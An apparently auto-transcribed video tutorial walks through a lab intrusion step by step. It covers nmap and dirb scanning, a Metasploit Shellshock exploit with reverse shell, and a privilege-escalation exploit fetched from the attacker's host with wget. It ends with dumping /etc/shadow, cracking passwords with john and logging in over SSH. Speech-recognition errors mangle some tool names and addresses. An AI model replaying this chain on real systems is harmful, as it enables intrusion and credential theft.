  "text": "and yesterday we'll be learning\nend-to-end article hacking by going\nafter a specific system and we're\nlearning step by step what we can do\nexactly to scan a device and then after\nwhich to be able to gain complete\ncontrol of the entire computer system\nand remember kids hacking is illegal if\nyou want to run any of these radical\nhacking techniques do not try it on mr\nhackaloy\n[Music]\nnumber one we'll be learning about what\nwe can do in terms of scanning devices\nall right so when we scan a device we're\ntrying to look out for vulnerabilities\nand it could be a server it could be a\nphone it could be any of these devices\nthat you're trying to go after number\ntwo what we're trying to do here is to\nfind a vulnerability inside the system\nthat we can take advantage of so once we\nfind a loophole all right we will be\nable to gain complete control of the\ndevice and once we're in the question\nmark is going to be what else can we do\nall right so once you're in what is it\ncan we can do in terms of post\nexploitation all right what can we do to\nelevate our privileges to be able to\ngain complete control of the system to\neven break the password of the computer\nso as you can see right here on the left\nside we have the hacker computer all\nright so this is hacker and what the\nhacker want to do is then to be able to\nfirst scan and then loose down all of\nthose services for example do they have\na file transfer protocol server do they\nhave a secure shell being opened up do\nthey have a website running so that we\ncan take advantage of those weaknesses\nwithin it and so on and so forth and\nonce we're able to list down all of this\nwe can get the version and then from\nthere we can determine all right what\nare the different attack methods that we\ncan go after so right here this is the\nplace where we'll be thinking and\ndeciding about what are the different\ntypes of attack methods that we can use\nthen after which we can launch a target\nagainst say the website okay launch an\nattack against into the ftp server into\nsecure shell whichever the case is once\nwe have uncovered exploit to use and\nonce we're in right here into the system\nright what we want to do then is to\nelevate our privileges so that from a\nnormal user we now have the ability to\nget root access meaning that we can\nliterally do anything we want with the\ndevice remember smash the like button\nand turn on notifications so that you\ndon't get hacked so right in front of us\nwe're in call linux and the first thing\nyou want to do is go ahead and open up\nterminal and once you're on terminal\nwhat you want to do right here is to\nhave the ability to begin scanning the\ndevice or the server or the system\nhowever you want to call it so the first\nthing you want to do is enter nmap so\nnmap is going to be the tool that we'll\nuse to help us scan the target device so\nhere when you enter nmap you can see all\nthe options are available for us to scan\nthe device to look out for all the\nservices so literally like knocking door\non the house trying to scan a house\nlooking out for openings that we can\nthen of course be able to jump into the\nhouse and take out for example the cash\nand the valuables and the jewelries\nright so this is exactly what we'll be\ndoing as part of launching the attack so\nthe first thing you want to do is to\nscan the ip address all the hostname all\nthe domain name the goal is that now you\nhave a target in mind so you can enter\nfor example the following which is nmap\nand what we want to do now is to enter\nsay 1i2\n168.00114 so this is going to be target\ndevice that we're going after so in this\ncase i can enter dash as follow by v so\nthis is for the service version that\nwe're going after dash capital o for the\noperating system version so we want to\nknow whether it is a linux what version\nof linux is it if it is a windows\ncomputer what version of windows\ncomputer is it running on and then after\nwhich we want to target the ports so\nports are the services that can be made\navailable from the target device so in\nthis case we can target say from port\none all the way to six five five three\nfive so once you're done with that hit\nenter and of course we asked to enter\nsuperuser do all right because it\nrequires root privileges so enter on\nthat enter your password hit enter and\nnow we're scanning the device to look up\nfor all these different services that\nare running on the server and now the\nscan is completed so right here you can\nsee the following all right we have all\nthis different port numbers all right\nfollowed by the protocol so in this case\nthere could be protocols like\ntransmission control protocol and the\nstate is of course open and you can see\nat the same time what kind of service is\nit running on is it a file transfer\nprotocol secure shell all right http ipp\nand all of that all right so all of\ntheir services as well as the version on\nthe most right side so this is a really\nwonderful way to quickly identify all\nright all of these different services\nall of the different versions and once\nyou have the version you can then\ndetermine what kind of export you want\nto use to go after all these different\ntype of services so that you can have\naccess into the system and for today's\ncase we will be targeting on apigee and\nso you can see right here we have http\n2.4.7 so we'll be targeting the\nfollowing so as part of targeted device\nall we got to do is just go ahead and\nenter the domain name of the ip address\nhere and you can see right here this is\nthe directory listing so you can see all\nof the directories the files within it\nso you can always click around to do\nyour enumeration and find out right what\nis going on so this is a really quick\nway for you to look out for all these\ndifferent ways and all these different\nservices that can be helped fd for\nexample in this case the apogee the web\nserver level and what we can do next is\njump over to use a tool called dirb so\nthis is a way for us to be able to look\nout for all the different directories\nthat is held by the server so that we\ncan possibly look out for some of these\nopenings which can give us an access\ninto the server okay so here you can see\nthe following all right all these are\ndifferent options available and you can\njust simply enter the following all\nright so here we go all these examples\nthe irb followed by the protocol of\ncourse in this case http and of course\nyou have the url and of course a\ntargeted directory so all you got to do\nnow is enter dirb okay let me go ahead\nand clear this\nenter d-i-r-b for my http\n182.168.0.114. and once you're done with\nthat go ahead and hit enter and you can\nsee right here okay we're scanning and\nwe're looking out for some really\ninteresting thing and as you can see\nwe're done so all we're going to do is\nscroll all the way back to the top and\nlook up for any interesting results and\none of those interesting results that we\nwant to target is the one right here\nokay so this is cgi bin and this is a\nplace where we're going to target the\nexploits next up what we really want to\ndo is to figure out what is really in\ncgi bit so all i got to do is enter dirb\nfollowed by slash cgi dash bin slash hit\nenter on that so we're trying to figure\nout are there any files within it so you\ncan see right here we have the following\nall right we have the cgi bin and of\ncourse we have the hollow world dot sh\nso this is the area for us to target and\ncgi stands for common gateway interface\nand it is a way for the web server to\ninteract with external content\ngenerating programs and so on and so\nforth so we'll be leveraging on this cgi\nor for us to be able to gain access into\nthe system so what we can do now is to\nuse a really handy tool called mad\nsplice so you can go ahead and enter\nsudo msf console hit enter on that and\nthis will start up metasploit and what\nwe are looking out for here in this case\nis to look for a exploit that we can use\nas part targeting server so all you got\nto do is enter search shell shop hit\nenter on that and here we have several\noptions available for us so we'll be\nusing one of that over here so this is\nthe one that we'll be targeting to use\nso it is going to be under exploit multi\nhttp apigee mod cgi bash environment\nexecute so all we're going to do now is\nenter use all right followed by one and\nonce you do that you can see the\nfollowing all right so we have exploit\nmulti http apigee mod cgi bash env exec\nalright so you can enter show options\nspecify the option as part of targeting\nthe server so all we got to do now is go\nahead and take a look at the following\nall right so we have the header so we'll\nbe using the http user agent header so\nthis is all the values you want to send\nso here we have the set r host and of\ncourse we have the arm path and we have\nthe target uri you have discovered so go\nahead and hit enter on that and the\nreason why we need a reverse shell is\nbecause the hacker wants to have taken\nadvantage of a vulnerability and they\nhave sent the exploit as well as the\npayload what happened is that if they\ntry to open up a service all right so\nwhen they open up a service so that they\ncan then finally be able to access over\ninto the system you realize that they'll\nget blocked the reason why they could\nget blocked is because there is a\nfirewall right here so the firewall will\nbe inspecting all this different traffic\nand of course at the same time filter\nout all these unnecessary ports that\ncould be opened up or all these\ndifferent services that could be open up\nas a result of that what the hackers\nwant to do is once they have exploited\nin the system they want to force a\nreverse connection outwards the reason\nis because a lot of all these different\nfirewalls they allow or complete\noutbound access all right so meaning\nthat they do not restrict a lot of all\nthese different outbound connectivities\nto the internet once you're ready in\nthree\ntwo\none hit exploit and you can see right\nhere materpata session two open\nand we have the following okay\nthat's it we are in it is game over it's\nas simple as that and once we're in i\ncan enter says info and you can see\nthe ip address the os the architecture\nand all of the data so quickly now what\nwe want to do is to be able to dump out\nthe username to passwords within the\ncomputer system so what i can do now is\nenter shell and see where we get all\nright so once we're in here i can enter\nwho am i and you notice that we're on\nwww dash data all right let's see\nwhether we are going to be able to do a\nto cat etc shadow and this is the place\nwhere all this important information\nusernames and all this data are there so\nwe are not able to do that i can enter\npwd so we have preen working directory\nso we have fairly limited access into\nthe system no worries i will teach you\nhow we can elevate our privileges in the\nsystem so here we have pretty good\nexample all right so here we have the\nfollowing of 2021\n0903 and we have 37292.c\nall right so this is the one we'll be\nusing as part of sending and uploading\ninto the server so that we can elevate\nour privileges okay so all we're going\nto do now is enter say torch\n37 292.c okay once you're entered on\nthat you can enter say mousepad 37292.c\nhit enter on that and all you got to do\nis just literally just copy and paste\nwhatever you're seeing right here and go\nahead and send it over into the file so\nsave it into file and once you're done\nwith that go ahead and close mousepad\nand what we can do now is jump back over\ninto terminal right and what we can do\nis go back into interpreter and what we\ncan do next is to upload the file so\nonce we're in interpreter all we're\ngoing to do is enter upload all right\nfollowed by slash loyalian desktop slash\n37292.c\nhit enter on that and see the following\noperation fail and the reason why you\nmay be getting this is because we do not\nhave right permission so if i go and\nenter shell so we're in right now so i\nenter pwd if i try to do say torch\nabc all right hit enter and that cannot\ntouch abc permission denied so we can\nexit from here and now what we can do is\nto think about whether we can upload\nthis file into our own server and then\nafter which\nfrom all right target or the session\nthat we currently have download the file\nand be able to run some\nother directories so going back into\nanother terminal all you're going to do\nis enter sudo systemctl all right fold\nby start\napogee2.service hit enter on that\nenter your password and this would help\nus start up\nthe apigee server so that we can host\nour malicious file so what you can do\nnow is go ahead and enter copy\n37292 into var www.html slash hit enter\non that so done we're able to now host\nthis file over and then the target user\ncan now download that file so what i can\ndo now is go ahead and say cd over slash\ntam all right so this is a directory\nthat's available in pretty much all of\nthe linux servers so that we can write a\ntemporary file in so what i can do now\nis go ahead do the following enter shell\nand to wget http 1i2\n168.0.192 followed by slash all right\n37292.c hit enter and that\noh my are you seeing that we just\ndownloaded the file meaning that we are\nnow able to execute on this by doing the\nfollowing okay so all we're going to do\nnow is enter gcc37292.c\nand then we want to output this over to\nsay follow ofs okay so done and next up\nwe can do a chmod plus x to make this\nexecutable ofs done enter dot slash ofs\nhit enter on that\nguess what all right who am i\nwe got root we're in we have complete\ncontrol over the entire system so what\nwe want to do now is to be able to break\nthe username and passwords on the linux\nserver yes i know this is pretty crazy\nstuff so what i can do now is go ahead\nand enter say cat etc shadow hit enter\non that and we have all these different\ndetails and you can save them all up\ninto a file alright so in this case we\ncan save all of this into a shadow file\non kala linux next up what we want to do\nis enter cad etc passwd hit enter on\nthat as well and likewise we want to\nsave this all right over into a file on\nkali linux so that we can do our\npassword breaking so i've already saved\nup the file and you'll be able to see\nthe following so i can do a cat\nshadow all right hit enter on that and\nwe can see all right the exact same file\nright here and we have many interesting\nuses like anakin skywalker darth vader\nall these really interesting star wars\ncharacters so next up what we can do is\nlikewise we can do a cam passwd all\nright so here same thing we're seeing\nall the exact same copy from the linux\nserver over into a collection machine so\nwhat we can do next is to go ahead and\nenter on shadow all right followed by\npasswd followed by shadow and then what\nwe can do now is i'll put it into\nunshadowed dot txt all right so go ahead\nand hit enter on that\nalright so done okay what we can do next\nis to use john john is going to be a\npassword cracking software it will use\nas part of breaking into that file so\nwhat we can do now is enter john full by\nthe word list equal all right so in this\ncase we can enter usr\nshare word lists follow my rockq.txt\nokay and then after which target the\nunshadow.txt\nand then three\ntwo one hit enter on that\nyou can see the following okay over here\nit states loaded one password hash okay\nso all we're gonna do right now is just\ndo the following by entering show so you\ncan enter john\nshow now we can enter unshadowed dot txt\nhit enter on that we got a following\nhere okay so we got vagrant vagrant so\nhere we got the username as well as the\npassword field just like that remember\nearlier we had a secure shell service\nthat's available so what we can do now\nis go ahead and enter ssh vargrand at\n192 168.0.114\nand hit enter on that now we can enter\nthe password all right which is vanguard\nas well what the heck we are in we have\na connection over into the linux server\nusing a broken username and password in\nterms of defense it's really important\nand critical to always be testing\nscanning your different servers that you\nhave because they could be hosting a lot\nof production workloads and you want to\nensure that there's no misconfiguration\nthere is no miss security patches so\nthat all this different type of exploits\ncannot be easily conducted against your\nservers so once again
